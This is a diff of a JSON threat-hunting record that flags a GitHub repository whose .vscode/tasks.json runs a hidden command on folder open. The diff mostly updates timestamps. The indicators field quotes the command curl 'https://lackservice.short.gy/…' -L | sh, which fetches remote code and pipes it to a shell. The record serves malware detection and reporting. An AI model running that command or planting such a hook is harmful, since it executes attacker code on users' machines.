@@ -2,6 +2,7 @@
   "finding": {
     "key": "repository:meharab/scam-origin",
     "kind": "repository",
+    "family": "",
     "id": "meharab/scam-origin",
     "url": "https://github.com/Meharab/scam-origin",
     "registry": "github",
@@ -20,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 5)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/meharab_scam-origin.json",
     "reviewer_decision": "",
     "notes": ""
@@ -61,7 +62,7 @@
     "evidence_references": "https://github.com/meharab/scam-origin/blob/082229b43088c0ffe08a9c5d23362327e3b3107c/.vscode/tasks.json",
     "verified_iocs": "lackservice.short.gy\nhttps://lackservice.short.gy/ZK1IS3k9m\nhttps://lackservice.short.gy/ZK1IS3k9l\nhttps://lackservice.short.gy/ZK1IS3k9w\ncurl 'https://lackservice.short.gy/ZK1IS3k9m' -L | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
